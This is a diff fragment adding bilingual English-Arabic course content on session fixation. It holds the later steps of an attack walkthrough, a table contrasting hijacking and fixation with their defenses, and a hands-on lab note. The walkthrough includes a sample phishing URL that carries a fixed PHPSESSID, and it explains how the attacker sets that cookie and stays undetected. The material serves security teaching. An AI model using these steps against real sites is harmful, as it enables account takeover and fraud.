+              "example": {
+                "en": "Phishing email: \"Verify your account: https://vulnerable-bank.com/login?PHPSESSID=attk3r5355i0n1d\"",
+                "ar": "بريد إلكتروني احتيالي: \"تحقق من حسابك: https://vulnerable-bank.com/login?PHPSESSID=attk3r5355i0n1d\""
+              }
+            },
+            {
+              "subtitle": {
+                "en": "Step 3: Victim Authenticates Using Fixed Session",
+                "ar": "الخطوة 3: يصادق الضحية باستخدام الجلسة الثابتة"
+              },
+              "text": {
+                "en": "Victim enters their legitimate username and password on the login page. Application verifies credentials successfully. Critical vulnerability: Application does NOT regenerate the session ID after login. Application associates the authenticated user with the existing (attacker-known) session ID. Session is now authenticated but still using the ID that the attacker controls.",
+                "ar": "يدخل الضحية اسم المستخدم وكلمة المرور الشرعيين على صفحة تسجيل الدخول. يتحقق التطبيق من بيانات الاعتماد بنجاح. الثغرة الحاسمة: لا يعيد التطبيق توليد معرف الجلسة بعد تسجيل الدخول. يربط التطبيق المستخدم المصادق عليه بمعرف الجلسة الموجود (المعروف للمهاجم). الجلسة الآن مصادق عليها ولكن لا تزال تستخدم المعرف الذي يتحكم فيه المهاجم."
+              },
+              "example": {
+                "en": "Victim logs in successfully. Session PHPSESSID=attk3r5355i0n1d is now authenticated as victim's account.",
+                "ar": "يسجل الضحية الدخول بنجاح. الجلسة PHPSESSID=attk3r5355i0n1d مصادق عليها الآن كحساب الضحية."
+              }
+            },
+            {
+              "subtitle": {
+                "en": "Step 4: Attacker Uses Fixed Session to Access Account",
+                "ar": "الخطوة 4: يستخدم المهاجم الجلسة الثابتة للوصول إلى الحساب"
+              },
+              "text": {
+                "en": "Attacker opens their own browser and manually sets the same session ID cookie. Attacker visits any page on the target website. Application recognizes the session ID as valid and authenticated. Attacker gains full access to victim's account without ever knowing the password. Attacker can perform any action the victim can: view sensitive data, make transactions, change settings.",
+                "ar": "يفتح المهاجم متصفحه الخاص ويعين يدوياً نفس ملف تعريف ارتباط معرف الجلسة. يزور المهاجم أي صفحة على الموقع المستهدف. يتعرف التطبيق على معرف الجلسة على أنه صالح ومصادق عليه. يحصل المهاجم على وصول كامل إلى حساب الضحية دون معرفة كلمة المرور أبداً. يمكن للمهاجم أداء أي إجراء يمكن للضحية: عرض بيانات حساسة، إجراء معاملات، تغيير الإعدادات."
+              },
+              "example": {
+                "en": "Attacker sets cookie: PHPSESSID=attk3r5355i0n1d and accesses https://vulnerable-bank.com/account → Full access granted",
+                "ar": "يعين المهاجم ملف تعريف الارتباط: PHPSESSID=attk3r5355i0n1d ويصل إلى https://vulnerable-bank.com/account → تم منح الوصول الكامل"
+              }
+            },
+            {
+              "subtitle": {
+                "en": "Step 5: Attack Remains Undetected",
+                "ar": "الخطوة 5: يبقى الهجوم غير مكتشف"
+              },
+              "text": {
+                "en": "Victim continues using their account normally, unaware of compromise. Application logs show no suspicious login attempts (victim logged in with correct password). Both victim and attacker can use the account simultaneously using the same session ID. Attack persists until victim logs out or session expires. If application has weak session timeout policies, attacker may maintain access for extended periods.",
+                "ar": "يستمر الضحية في استخدام حسابه بشكل طبيعي، غير مدرك للاختراق. تُظهر سجلات التطبيق عدم وجود محاولات تسجيل دخول مشبوهة (سجل الضحية الدخول بكلمة مرور صحيحة). يمكن لكل من الضحية والمهاجم استخدام الحساب في وقت واحد باستخدام نفس معرف الجلسة. يستمر الهجوم حتى يسجل الضحية الخروج أو تنتهي صلاحية الجلسة. إذا كان لدى التطبيق سياسات مهلة جلسة ضعيفة، فقد يحتفظ المهاجم بالوصول لفترات طويلة."
+              },
+              "example": {
+                "en": "Both attacker and victim can access account for hours until session timeout. No failed login alerts triggered.",
+                "ar": "يمكن لكل من المهاجم والضحية الوصول إلى الحساب لساعات حتى انتهاء مهلة الجلسة. لم يتم تفعيل تنبيهات فشل تسجيل الدخول."
+              }
+            }
+          ]
+        },
+        {
+          "id": 19,
+          "type": "table",
+          "title": {
+            "en": "Session Hijacking vs Session Fixation: Key Differences",
+            "ar": "اختطاف الجلسة مقابل تثبيت الجلسة: الاختلافات الرئيسية"
+          },
+          "headers": {
+            "en": [
+              "Aspect",
+              "Session Hijacking",
+              "Session Fixation"
+            ],
+            "ar": [
+              "الجانب",
+              "اختطاف الجلسة",
+              "تثبيت الجلسة"
+            ]
+          },
+          "rows": [
+            {
+              "en": [
+                "Attack timing",
+                "After victim authenticates",
+                "Before victim authenticates"
+              ],
+              "ar": [
+                "توقيت الهجوم",
+                "بعد أن يصادق الضحية",
+                "قبل أن يصادق الضحية"
+              ]
+            },
+            {
+              "en": [
+                "Session ID origin",
+                "Legitimate session created by victim",
+                "Session ID created or known by attacker first"
+              ],
+              "ar": [
+                "أصل معرف الجلسة",
+                "جلسة شرعية أنشأها الضحية",
+                "معرف الجلسة أنشأه أو عرفه المهاجم أولاً"
+              ]
+            },
+            {
+              "en": [
+                "Attack method",
+                "Steal existing valid session ID",
+                "Force victim to use predetermined session ID"
+              ],
+              "ar": [
+                "طريقة الهجوم",
+                "سرقة معرف جلسة صالح موجود",
+                "إجبار الضحية على استخدام معرف جلسة محدد مسبقاً"
+              ]
+            },
+            {
+              "en": [
+                "Vulnerability exploited",
+                "Weak session ID protection (no HTTPS, missing HttpOnly, XSS)",
+                "Application accepts external session IDs and doesn't regenerate on auth"
+              ],
+              "ar": [
+                "الثغرة المستغلة",
+                "حماية ضعيفة لمعرف الجلسة (لا HTTPS، HttpOnly مفقود، XSS)",
+                "يقبل التطبيق معرفات الجلسة الخارجية ولا يعيد التوليد عند المصادقة"
+              ]
+            },
+            {
+              "en": [
+                "Attack vector",
+                "Network sniffing, XSS, malware, MITM",
+                "Malicious links, XSS cookie setting, URL parameters"
+              ],
+              "ar": [
+                "ناقل الهجوم",
+                "شم الشبكة، XSS، برامج ضارة، MITM",
+                "روابط ضارة، إعداد ملف تعريف ارتباط XSS، معلمات URL"
+              ]
+            },
+            {
+              "en": [
+                "Primary defense",
+                "HTTPS, HttpOnly cookies, secure session storage",
+                "Regenerate session ID on login and privilege changes"
+              ],
+              "ar": [
+                "الدفاع الأساسي",
+                "HTTPS، ملفات تعريف ارتباط HttpOnly، تخزين جلسة آمن",
+                "إعادة توليد معرف الجلسة عند تسجيل الدخول وتغيرات الامتياز"
+              ]
+            },
+            {
+              "en": [
+                "Detection difficulty",
+                "Moderate (unusual IP, concurrent sessions)",
+                "Very difficult (legitimate login with correct password)"
+              ],
+              "ar": [
+                "صعوبة الكشف",
+                "متوسطة (IP غير عادي، جلسات متزامنة)",
+                "صعبة جداً (تسجيل دخول شرعي بكلمة مرور صحيحة)"
+              ]
+            }
+          ]
+        },
+        {
+          "id": 20,
+          "type": "note",
+          "noteType": "lab",
+          "value": {
+            "en": "Hands-On Lab: Exploit session fixation in a vulnerable application, then implement session regeneration defenses. Practice detecting hijacked sessions through log analysis and behavioral monitoring.",
+            "ar": "مختبر عملي: استغل تثبيت الجلسة في تطبيق ضعيف، ثم نفذ دفاعات إعادة توليد الجلسة. مارس كشف الجلسات المخترقة من خلال تحليل السجلات والمراقبة السلوكية."
+          },
+          "link": "",
+          "isLab": true
+        }
+      ]
+    }
+  ]
+}
